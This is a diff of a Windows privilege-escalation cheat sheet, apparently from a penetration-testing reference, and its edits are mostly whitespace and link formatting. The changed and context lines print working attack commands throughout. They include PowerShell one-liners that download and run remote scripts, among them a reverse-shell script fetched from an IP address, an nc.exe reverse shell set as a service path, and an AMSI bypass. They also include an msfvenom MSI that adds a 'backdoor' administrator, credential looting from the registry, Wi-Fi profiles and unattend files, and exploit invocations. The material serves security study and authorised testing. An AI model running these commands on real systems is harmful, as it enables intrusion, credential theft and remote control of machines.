@@ -7,19 +7,19 @@
 * [User Enumeration](#user-enumeration)
 * [Network Enumeration](#network-enumeration)
 * [Antivirus & Detections](#antivirus--detections)
-    * [Windows Defender](#windows-defender)
-    * [AppLocker Enumeration](#applocker-enumeration)
-    * [Powershell](#powershell)
-    * [Default Writeable Folders](#default-writeable-folders)
+  * [Windows Defender](#windows-defender)
+  * [AppLocker Enumeration](#applocker-enumeration)
+  * [Powershell](#powershell)
+  * [Default Writeable Folders](#default-writeable-folders)
 * [EoP - Looting for passwords](#eop---looting-for-passwords)
-    * [SAM and SYSTEM files](#sam-and-system-files)
-    * [Search for file contents](#search-for-file-contents)
-    * [Search for a file with a certain filename](#search-for-a-file-with-a-certain-filename)
-    * [Search the registry for key names and passwords](#search-the-registry-for-key-names-and-passwords)
-    * [Passwords in unattend.xml](#passwords-in-unattendxml)
-    * [Wifi passwords](#wifi-passwords)
-    * [Passwords stored in services](#passwords-stored-in-services)
-    * [Powershell history](#powershell-history)
+  * [SAM and SYSTEM files](#sam-and-system-files)
+  * [Search for file contents](#search-for-file-contents)
+  * [Search for a file with a certain filename](#search-for-a-file-with-a-certain-filename)
+  * [Search the registry for key names and passwords](#search-the-registry-for-key-names-and-passwords)
+  * [Passwords in unattend.xml](#passwords-in-unattendxml)
+  * [Wifi passwords](#wifi-passwords)
+  * [Passwords stored in services](#passwords-stored-in-services)
+  * [Powershell history](#powershell-history)
 * [EoP - Processes Enumeration and Tasks](#eop---processes-enumeration-and-tasks)
 * [EoP - Incorrect permissions in services](#eop---incorrect-permissions-in-services)
 * [EoP - Windows Subsystem for Linux (WSL)](#eop---windows-subsystem-for-linux-wsl)
@@ -51,31 +51,40 @@
 ## Tools
 
 - [PowerSploit's PowerUp](https://github.com/PowerShellMafia/PowerSploit)
+
     ```powershell
     powershell -Version 2 -nop -exec bypass IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerUp/PowerUp.ps1'); Invoke-AllChecks
     ```
+
 - [Watson - Watson is a (.NET 2.0 compliant) C# implementation of Sherlock](https://github.com/rasta-mouse/Watson)
 - [(Deprecated) Sherlock - PowerShell script to quickly find missing software patches for local privilege escalation vulnerabilities](https://github.com/rasta-mouse/Sherlock)
+
     ```powershell
     powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File Sherlock.ps1
     ```
+
 - [BeRoot - Privilege Escalation Project - Windows / Linux / Mac](https://github.com/AlessandroZ/BeRoot)
 - [Windows-Exploit-Suggester](https://github.com/GDSSecurity/Windows-Exploit-Suggester)
+
     ```powershell
     ./windows-exploit-suggester.py --update
-    ./windows-exploit-suggester.py --database 2014-06-06-mssb.xlsx --systeminfo win7sp1-systeminfo.txt 
+    ./windows-exploit-suggester.py --database 2014-06-06-mssb.xlsx --systeminfo win7sp1-systeminfo.txt
     ```
+
 - [windows-privesc-check - Standalone Executable to Check for Simple Privilege Escalation Vectors on Windows Systems](https://github.com/pentestmonkey/windows-privesc-check)
 - [WindowsExploits - Windows exploits, mostly precompiled. Not being updated.](https://github.com/abatchy17/WindowsExploits)
 - [WindowsEnum - A Powershell Privilege Escalation Enumeration Script.](https://github.com/absolomb/WindowsEnum)
 - [Seatbelt - A C# project that performs a number of security oriented host-survey "safety checks" relevant from both offensive and defensive security perspectives.](https://github.com/GhostPack/Seatbelt)
+
     ```powershell
     Seatbelt.exe -group=all -full
     Seatbelt.exe -group=system -outputfile="C:\Temp\system.txt"
     Seatbelt.exe -group=remote -computername=dc.theshire.local -computername=192.168.230.209 -username=THESHIRE\sam -password="yum \"po-ta-toes\""
     ```
+
 - [Powerless - Windows privilege escalation (enumeration) script designed with OSCP labs (legacy Windows) in mind](https://github.com/M4ximuss/Powerless)
 - [JAWS - Just Another Windows (Enum) Script](https://github.com/411Hall/JAWS)
+
     ```powershell
     powershell.exe -ExecutionPolicy Bypass -File .\jaws-enum.ps1 -OutputFilename JAWS-Enum.txt
     ```
@@ -87,6 +96,7 @@ systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
 ```
 
 Extract patchs and updates
+
 ```powershell
 wmic qfe
 ```
@@ -201,7 +211,7 @@ List firewall state and current configuration
 ```powershell
 netsh advfirewall firewall dump
 
-or 
+or
 
 netsh firewall show state
 netsh firewall show config
@@ -272,7 +282,6 @@ Example of AMSI Bypass.
 PS C:\> [Ref].Assembly.GetType('System.Management.Automation.Ams'+'iUtils').GetField('am'+'siInitFailed','NonPu'+'blic,Static').SetValue($null,$true)
 ```
 
-
 ### Default Writeable Folders
 
 ```powershell
@@ -330,7 +339,7 @@ REG QUERY HKLM /F "password" /t REG_SZ /S /K
 REG QUERY HKCU /F "password" /t REG_SZ /S /K
 
 reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" # Windows Autologin
-reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr "DefaultUserName DefaultDomainName DefaultPassword" 
+reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr "DefaultUserName DefaultDomainName DefaultPassword"
 reg query "HKLM\SYSTEM\Current\ControlSet\Services\SNMP" # SNMP parameters
 reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" # Putty clear text proxy credentials
 reg query "HKCU\Software\ORL\WinVNC3\Password" # VNC credentials
@@ -384,7 +393,7 @@ Example content
 Unattend credentials are stored in base64 and can be decoded manually with base64.
 
 ```powershell
-$ echo "U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo="  | base64 -d 
+$ echo "U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo="  | base64 -d
 SecretSecurePassword1234*
 ```
 
@@ -427,11 +436,13 @@ dir c:*ultravnc.ini /s /b
 ### Wifi passwords
 
 Find AP SSID
+
 ```bat
 netsh wlan show profile
 ```
 
 Get Cleartext Pass
+
 ```bat
 netsh wlan show profile <SSID> key=clear
 ```
@@ -445,7 +456,6 @@ cls & echo. & for /f "tokens=4 delims=: " %a in ('netsh wlan show profiles ^| fi
 ### Passwords stored in services
 
 Saved session information for PuTTY, WinSCP, FileZilla, SuperPuTTY, and RDP using [SessionGopher](https://github.com/Arvanaghi/SessionGopher)
-
 
 ```powershell
 https://raw.githubusercontent.com/Arvanaghi/SessionGopher/master/SessionGopher.ps1
@@ -528,10 +538,12 @@ dir "C:\Documents and Settings\%username%\Start Menu\Programs\Startup"
 > A service running as Administrator/SYSTEM with incorrect file permissions might allow EoP. You can replace the binary, restart the service and get system.
 
 Often, services are pointing to writeable locations:
+
 - Orphaned installs, not installed anymore but still exist in startup
 - DLL Hijacking
+
     ```powershell
-    # find missing DLL 
+    # find missing DLL
     - Find-PathDLLHijack PowerUp.ps1
     - Process Monitor : check for "Name Not Found"
 
@@ -566,7 +578,7 @@ FOR /F %i in (services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> path.tx
 Alternatively you can use the Metasploit exploit : `exploit/windows/local/service_permissions`
 
 Note to check file permissions you can use `cacls` and `icacls`
-> icacls (Windows Vista +)    
+> icacls (Windows Vista +)
 > cacls (Windows XP)
 
 You are looking for `BUILTIN\Users:(F)`(Full access), `BUILTIN\Users:(M)`(Modify access) or  `BUILTIN\Users:(W)`(Write-only access) in the output.
@@ -584,11 +596,11 @@ PS C:\Windows\system32> sc.exe qc usosvc
 [SC] QueryServiceConfig SUCCESS
 
 SERVICE_NAME: usosvc
-        TYPE               : 20  WIN32_SHARE_PROCESS 
+        TYPE               : 20  WIN32_SHARE_PROCESS
         START_TYPE         : 2   AUTO_START  (DELAYED)
         ERROR_CONTROL      : 1   NORMAL
         BINARY_PATH_NAME   : C:\Users\mssql-svc\Desktop\nc.exe 10.10.10.10 4444 -e cmd.exe
-        LOAD_ORDER_GROUP   : 
+        LOAD_ORDER_GROUP   :
         TAG                : 0
         DISPLAY_NAME       : Update Orchestrator Service
         DEPENDENCIES       : rpcss
@@ -699,6 +711,7 @@ gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Whe
 ### Example
 
 For `C:\Program Files\something\legit.exe`, Windows will try the following paths first:
+
 - `C:\Program.exe`
 - `C:\Program Files.exe`
 
@@ -709,12 +722,12 @@ For `C:\Program Files\something\legit.exe`, Windows will try the following paths
 3. Reverse engineering software
 4. Send data throught the named pipe : `program.exe >\\.\pipe\StdOutPipe 2>\\.\pipe\StdErrPipe`
 
-
 ## EoP - Kernel Exploitation
 
 List of exploits kernel : [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)
 
 ##### #Security Bulletin&nbsp;&nbsp;&nbsp;#KB &nbsp;&nbsp;&nbsp;&nbsp;#Description&nbsp;&nbsp;&nbsp;&nbsp;#Operating System  
+
 - [MS17-017](https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS17-017) 　[KB4013081]　　[GDI Palette Objects Local Privilege Escalation]　　(windows 7/8)
 - [CVE-2017-8464](https://github.com/SecWiki/windows-kernel-exploits/tree/master/CVE-2017-8464) 　[LNK Remote Code Execution Vulnerability]　　(windows 10/8.1/7/2016/2010/2008)
 - [CVE-2017-0213](https://github.com/SecWiki/windows-kernel-exploits/tree/master/CVE-2017-0213) 　[Windows COM Elevation of Privilege Vulnerability]　　(windows 10/8.1/7/2016/2010/2008)
@@ -728,7 +741,7 @@ List of exploits kernel : [https://github.com/SecWiki/windows-kernel-exploits](h
 - [MS16-034](https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS16-034) 　[KB3143145]　　[Kernel Driver]　　(2008/7/8/10/2012)
 - [MS16-032](https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS16-032) 　[KB3143141]　　[Secondary Logon Handle]　　(2008/7/8/10/2012)
 - [MS16-016](https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS16-016) 　[KB3136041]　　[WebDAV]　　(2008/Vista/7)
-- [MS16-014](https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS16-014) 　[K3134228]　　[remote code execution]　　(2008/Vista/7)    
+- [MS16-014](https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS16-014) 　[K3134228]　　[remote code execution]　　(2008/Vista/7)
 ...
 - [MS03-026](./MS03-026) 　[KB823980]　　 [Buffer Overrun In RPC Interface]　　(/NT/2000/XP/2003)  
 
@@ -743,15 +756,15 @@ Kali> i586-mingw32msvc-gcc -o adduser.exe useradd.c
 Check if these registry values are set to "1".
 
 ```bat
-$ reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
-$ reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
 ```
 
 Then create an MSI package and install it.
 
 ```powershell
-$ msfvenom -p windows/adduser USER=backdoor PASS=backdoor123 -f msi -o evil.msi
-$ msiexec /quiet /qn /i C:\evil.msi
+msfvenom -p windows/adduser USER=backdoor PASS=backdoor123 -f msi -o evil.msi
+msiexec /quiet /qn /i C:\evil.msi
 ```
 
 Technique also available in Metasploit : `exploit/windows/local/always_install_elevated`
@@ -763,6 +776,7 @@ Application running as SYSTEM allowing an user to spawn a CMD, or browse directo
 Example: "Windows Help and Support" (Windows + F1), search for "command prompt", click on "Click to open Command Prompt"
 
 ## EoP - Evaluating Vulnerable Drivers
+
 Look for vuln drivers loaded, we often don't spend enough time looking at this:
 
 ```powershell
@@ -807,8 +821,9 @@ Currently stored credentials:
  User: WORKGROUP\Administrator
 ```
 
-Then you can use `runas` with the `/savecred` options in order to use the saved credentials. 
+Then you can use `runas` with the `/savecred` options in order to use the saved credentials.
 The following example is calling a remote binary via an SMB share.
+
 ```powershell
 runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
 ```
@@ -849,7 +864,7 @@ PsExec.exe -i -s cmd.exe
 
 ## EoP - Living Off The Land Binaries and Scripts
 
-Living Off The Land Binaries and Scripts (and also Libraries) : https://lolbas-project.github.io/
+Living Off The Land Binaries and Scripts (and also Libraries) : <https://lolbas-project.github.io/>
 
 > The goal of the LOLBAS project is to document every binary, script, and library that can be used for Living Off The Land techniques.
 
@@ -868,7 +883,7 @@ Microsoft.Workflow.Compiler.exe tests.xml results.xml
 
 ## EoP - Impersonation Privileges
 
-Full privileges cheatsheet at https://github.com/gtworek/Priv2Admin, summary below will only list direct ways to exploit the privilege to obtain an admin session or read sensitive files.
+Full privileges cheatsheet at <https://github.com/gtworek/Priv2Admin>, summary below will only list direct ways to exploit the privilege to obtain an admin session or read sensitive files.
 
 | Privilege | Impact | Tool | Execution path | Remarks |
 | --- | --- | --- | --- | --- |
@@ -912,21 +927,20 @@ SeIncreaseWorkingSetPrivilege Increase a process working set            Enabled
 c:\TOOLS>FullPowers -c "C:\TOOLS\nc64.exe 1.2.3.4 1337 -e cmd" -z
 ```
 
-
 ### Meterpreter getsystem and alternatives
 
 ```powershell
-meterpreter> getsystem 
-Tokenvator.exe getsystem cmd.exe 
-incognito.exe execute -c "NT AUTHORITY\SYSTEM" cmd.exe 
-psexec -s -i cmd.exe 
+meterpreter> getsystem
+Tokenvator.exe getsystem cmd.exe
+incognito.exe execute -c "NT AUTHORITY\SYSTEM" cmd.exe
+psexec -s -i cmd.exe
 python getsystem.py # from https://github.com/sailay1996/tokenx_privEsc
 ```
 
 ### RottenPotato (Token Impersonation)
 
-Binary available at : https://github.com/foxglovesec/RottenPotato
-Binary available at : https://github.com/breenmachine/RottenPotatoNG
+Binary available at : <https://github.com/foxglovesec/RottenPotato>
+Binary available at : <https://github.com/breenmachine/RottenPotatoNG>
 
 ```c
 getuid
@@ -944,11 +958,10 @@ Invoke-TokenManipulation -ImpersonateUser -Username "NT AUTHORITY\SYSTEM"
 Get-Process wininit | Invoke-TokenManipulation -CreateProcess "Powershell.exe -nop -exec bypass -c \"IEX (New-Object Net.WebClient).DownloadString('http://10.7.253.6:82/Invoke-PowerShellTcp.ps1');\"};"
 ```
 
-
 ### Juicy Potato (abusing the golden privileges)
 
-Binary available at : https://github.com/ohpe/juicy-potato/releases    
-:warning: Juicy Potato doesn't work on Windows Server 2019 and Windows 10 1809 +. 
+Binary available at : https://github.com/ohpe/juicy-potato/releases
+:warning: Juicy Potato doesn't work on Windows Server 2019 and Windows 10 1809 +.
 
 1. Check the privileges of the service account, you should look for **SeImpersonate** and/or **SeAssignPrimaryToken** (Impersonate a client after authentication)
 
@@ -958,13 +971,13 @@ Binary available at : https://github.com/ohpe/juicy-potato/releases
 
 2. Select a CLSID based on your Windows version, a CLSID is a globally unique identifier that identifies a COM class object
 
-    * [Windows 7 Enterprise](https://ohpe.it/juicy-potato/CLSID/Windows_7_Enterprise) 
+    * [Windows 7 Enterprise](https://ohpe.it/juicy-potato/CLSID/Windows_7_Enterprise)
     * [Windows 8.1 Enterprise](https://ohpe.it/juicy-potato/CLSID/Windows_8.1_Enterprise)
     * [Windows 10 Enterprise](https://ohpe.it/juicy-potato/CLSID/Windows_10_Enterprise)
     * [Windows 10 Professional](https://ohpe.it/juicy-potato/CLSID/Windows_10_Pro)
-    * [Windows Server 2008 R2 Enterprise](https://ohpe.it/juicy-potato/CLSID/Windows_Server_2008_R2_Enterprise) 
+    * [Windows Server 2008 R2 Enterprise](https://ohpe.it/juicy-potato/CLSID/Windows_Server_2008_R2_Enterprise)
     * [Windows Server 2012 Datacenter](https://ohpe.it/juicy-potato/CLSID/Windows_Server_2012_Datacenter)
-    * [Windows Server 2016 Standard](https://ohpe.it/juicy-potato/CLSID/Windows_Server_2016_Standard) 
+    * [Windows Server 2016 Standard](https://ohpe.it/juicy-potato/CLSID/Windows_Server_2016_Standard)
 
 3. Execute JuicyPotato to run a privileged command.
 
@@ -1011,8 +1024,7 @@ Example: MS08_067_2018.py 192.168.1.1 7 445 -- for Windows XP SP3 English (Alway
 python ms08-067.py 10.0.0.1 6 445
 ```
 
-
-### MS10-015 (KiTrap0D) - Microsoft Windows NT/2000/2003/2008/XP/Vista/7 
+### MS10-015 (KiTrap0D) - Microsoft Windows NT/2000/2003/2008/XP/Vista/7
 
 'KiTrap0D' User Mode to Ring Escalation (MS10-015)
 
@@ -1044,7 +1056,6 @@ https://github.com/rootphantomer/exp/raw/master/ms15-051%EF%BC%88%E4%BF%AE%E6%94
 https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS15-051
 use exploit/windows/local/ms15_051_client_copy_image
 ```
-
 
 ### MS16-032 - Microsoft Windows 7 < 10 / 2008 < 2012 R2 (x86/x64)
 
@@ -1090,18 +1101,20 @@ python2 send_and_execute.py 10.0.0.1 revshell.exe
 
 ### CVE-2019-1388
 
-Exploit : https://packetstormsecurity.com/files/14437/hhupd.exe.html
+Exploit : <https://packetstormsecurity.com/files/14437/hhupd.exe.html>
 
 Working on :
-- Windows 7 
+
+- Windows 7
 - Windows 10 LTSC 10240
 
-Failing on : 
+Failing on :
+
 - LTSC 2019
 - 1709
 - 1803
 
-Detailed information about the vulnerability : https://www.zerodayinitiative.com/blog/2019/11/19/thanksgiving-treat-easy-as-pie-windows-7-secure-desktop-escalation-of-privilege
+Detailed information about the vulnerability : <https://www.zerodayinitiative.com/blog/2019/11/19/thanksgiving-treat-easy-as-pie-windows-7-secure-desktop-escalation-of-privilege>
 
 ## References
 
@@ -1125,7 +1138,7 @@ Detailed information about the vulnerability : https://www.zerodayinitiative.com
 * [Pentestlab.blog - WPE-06 - Hot Potato](https://pentestlab.blog/2017/04/13/hot-potato/)
 * [Pentestlab.blog - WPE-07 - Group Policy Preferences](https://pentestlab.blog/2017/03/20/group-policy-preferences/)
 * [Pentestlab.blog - WPE-08 - Unquoted Service Path](https://pentestlab.blog/2017/03/09/unquoted-service-path/)
-* [Pentestlab.blog - WPE-09 - Always Install Elevated](https://pentestlab.blog/2017/02/28/always-install-elevated/) 
+* [Pentestlab.blog - WPE-09 - Always Install Elevated](https://pentestlab.blog/2017/02/28/always-install-elevated/)
 * [Pentestlab.blog - WPE-10 - Token Manipulation](https://pentestlab.blog/2017/04/03/token-manipulation/)
 * [Pentestlab.blog - WPE-11 - Secondary Logon Handle](https://pentestlab.blog/2017/04/07/secondary-logon-handle/)
 * [Pentestlab.blog - WPE-12 - Insecure Registry Permissions](https://pentestlab.blog/2017/03/31/insecure-registry-permissions/)
